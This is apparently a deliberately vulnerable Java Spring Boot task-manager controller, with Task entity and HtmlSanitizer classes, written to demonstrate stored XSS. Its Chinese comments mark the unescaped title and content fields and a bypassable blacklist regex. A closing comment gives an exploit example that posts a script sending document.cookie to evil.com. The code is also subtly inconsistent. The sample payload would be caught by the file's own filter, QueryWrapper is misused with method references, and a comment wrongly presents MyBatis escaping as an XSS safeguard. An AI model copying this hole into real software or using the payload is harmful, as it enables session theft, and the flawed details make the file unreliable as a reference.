package com.task.manager.controller;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.task.manager.entity.Task;
import com.task.manager.service.TaskService;
import com.task.manager.util.HtmlSanitizer;
import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.regex.Pattern;

/**
 * 任务管理控制器
 * @author Dev Team
 */
@RestController
@RequestMapping("/api/tasks")
@RequiredArgsConstructor
public class TaskController {
    private final TaskService taskService;
    private static final Pattern XSS_PATTERN = Pattern.compile("<(script|img|svg|body|style)\\b", Pattern.CASE_INSENSITIVE);

    /**
     * 创建任务（存在XSS漏洞）
     * 漏洞点：未正确转义用户输入的title和content字段
     */
    @PostMapping
    public ResponseEntity<Task> createTask(@RequestBody Task task) {
        // 输入验证（存在绕过可能）
        if (containsXssPattern(task.getTitle()) || containsXssPattern(task.getContent())) {
            throw new IllegalArgumentException("Invalid input");
        }
        
        // 存储任务（未净化HTML内容）
        Task savedTask = taskService.save(task);
        return ResponseEntity.ok(savedTask);
    }

    /**
     * 获取任务详情（漏洞触发点）
     * 返回JSON响应时未对任务内容进行HTML编码
     */
    @GetMapping("/{id}")
    public ResponseEntity<Task> getTask(@PathVariable Long id) {
        Task task = taskService.getById(id);
        if (task == null) {
            return ResponseEntity.notFound().build();
        }
        return ResponseEntity.ok(task);
    }

    /**
     * 分页查询任务（安全实现）
     * 使用MyBatis Plus的自动转义机制
     */
    @GetMapping
    public ResponseEntity<Page<Task>> listTasks(Page<Task> page) {
        Page<Task> result = taskService.page(page, new QueryWrapper<Task>().select(Task::getId, Task::getTitle));
        return ResponseEntity.ok(result);
    }

    /**
     * 更新任务（安全实现）
     * 使用了HTML净化工具类
     */
    @PutMapping("/{id}")
    public ResponseEntity<Task> updateTask(@PathVariable Long id, @RequestBody Task updatedTask) {
        Task existingTask = taskService.getById(id);
        if (existingTask == null) {
            return ResponseEntity.notFound().build();
        }
        
        // 使用HTML净化工具（但仅在更新时生效）
        existingTask.setTitle(HtmlSanitizer.sanitize(updatedTask.getTitle()));
        existingTask.setContent(HtmlSanitizer.sanitize(updatedTask.getContent()));
        
        Task savedTask = taskService.save(existingTask);
        return ResponseEntity.ok(savedTask);
    }

    private boolean containsXssPattern(String input) {
        return input != null && XSS_PATTERN.matcher(input).find();
    }

    /*
     * 漏洞利用示例：
     * curl -X POST http://api/tasks -d '{
     *   "title": "<script>document.location='http://evil.com/cookie?'+document.cookie</script>",
     *   "content": "Normal content"
     * }'
     * 
     * 当其他用户访问GET /api/tasks/{id}时，恶意脚本将在其浏览器上下文中执行
     */
}

// Task.java
package com.task.manager.entity;

import lombok.Data;

/**
 * 任务实体类
 */
@Data
public class Task {
    private Long id;
    private String title;  // 漏洞字段：未转义的标题
    private String content; // 漏洞字段：未转义的内容
    private String priority;
    private String status;
}

// HtmlSanitizer.java
package com.task.manager.util;

import org.apache.commons.text.StringEscapeUtils;

/**
 * HTML内容净化工具类（在更新操作中使用）
 */
public class HtmlSanitizer {
    public static String sanitize(String html) {
        if (html == null) return null;
        // 使用Apache Commons Text进行HTML转义
        return StringEscapeUtils.escapeHtml4(html);
    }
}